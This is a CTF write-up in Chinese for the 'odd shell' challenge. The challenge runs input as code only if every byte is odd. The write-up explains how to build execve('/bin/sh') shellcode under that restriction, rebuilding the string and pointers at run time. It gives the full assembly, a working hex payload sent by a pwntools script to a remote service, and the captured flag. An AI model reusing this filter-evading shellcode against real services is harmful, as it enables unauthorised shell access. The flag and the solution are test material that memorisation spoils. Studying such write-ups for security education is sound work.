# odd shell

## 题目简述

程序把最多 `0x800` 字节输入读入固定地址 `0x123412340000` 的 RWX 映射，去掉末尾换行后逐字节检查：

```c
for (ssize_t i = 0; i < rd; i++) {
    if (!((unsigned char)response[i] & 1)) {
        puts("Invalid Character");
        exit(0xffffffff);
    }
}

((void (*)())response)();
```

因此 shellcode 中每个字节的最低位都必须为 1，也就是只能出现奇数字节。限制针对机器码而不是汇编源码：操作码、ModR/M、SIB、位移和立即数都必须逐字节满足条件。

## 解题过程

目标仍是执行 `execve("/bin/sh", NULL, NULL)`，即在 AMD64 下令：

```text
rax = 59
rdi = &"/bin/sh\x00"
rsi = 0
rdx = 0
syscall
```

### 动态合成字符串与栈指针

字符串本身包含偶数字节，不能直接作为立即数嵌入。官方解法先加载经过左移和扰动的奇数字节常量，再用同样满足过滤条件的 mask、`and` 和移位在寄存器中还原 `/bin/sh\x00`：

```asm
mov r15, 0x1A1CDBDB9A589BD
mov r13, 0xFFFFFDFFFFFFFDFD
shr r13, 1
and r13, r15
shr r13, 1
shr r13, 1
push r13
```

目标二进制在跳转到映射页时具有稳定栈帧关系：shellcode 入口处 `rbp = rsp + 0x28`。推入八字节字符串后，字符串地址就是 `rbp - 0x30`。立即数 `0x30` 为偶数，所以拆成两个奇数 `0x2f + 0x01`：

```asm
push rbp
pop r13
sub r13, 0x2f
sub r13, 0x01
push r13
pop rdi
```

这个偏移依赖题目所给二进制的实际函数序言与调用点，迁移到其他构建时必须重新调试确认，不能把 `0x28` 当成 ABI 固定值。

### 设置寄存器并调用 execve

选取编码字节全为奇数的指令清零参数，并把系统调用号 `0x3b` 转入 `eax`：

```asm
xor r11d, r11d
lea esi, [r11d]
lea edx, [r11d]

xor ebx, ebx
mov bl, 0x3b
mov r11d, ebx
lea eax, [r11d]

syscall
```

`syscall` 的机器码为 `0f 05`，两个字节恰好都是奇数。完整 payload 可直接使用仓库 healthcheck 中已经固定的机器码：

```python
from pwn import *

payload = bytes.fromhex(
    "49bfbd89a5b9bdcda101"
    "49bdfdfdfffffffdffff"
    "49d1ed4d21fd49d1ed49d1ed"
    "415555415d4983ed2f4983ed0141555f"
    "4531db67418d3367418d13"
    "31dbb33b4189db67418d030f05"
)

assert len(payload) <= 0x800
assert all(byte & 1 for byte in payload)

io = remote(HOST, PORT)
io.recvuntil(b"Display your oddities:\n")
io.sendline(payload)       # 服务端会先剥离末尾换行
io.sendline(b"cat /flag")
print(io.recvuntil(b"}").decode())
```

成功进入 shell 后读取 `/flag`，得到：

```text
uiuctf{5uch_0dd_by4t3s_1n_my_r3g1st3rs!}
```

## 方法总结

- 核心技巧：在“每个机器码字节必须为奇数”的约束下选择替代指令，并在运行时合成无法直接嵌入的字符串、常量和指针。
- 识别信号：过滤循环检查原始 payload 字节而不限制最终寄存器和内存值，说明可以通过算术、位运算、栈操作和等价指令绕过表示层约束。
- 复用要点：汇编后必须对最终字节串执行自动断言；源码看似合法不代表编码合法。栈帧偏移、寄存器初值和指令编码都属于利用前置条件，应以目标二进制反汇编或调试结果为准。
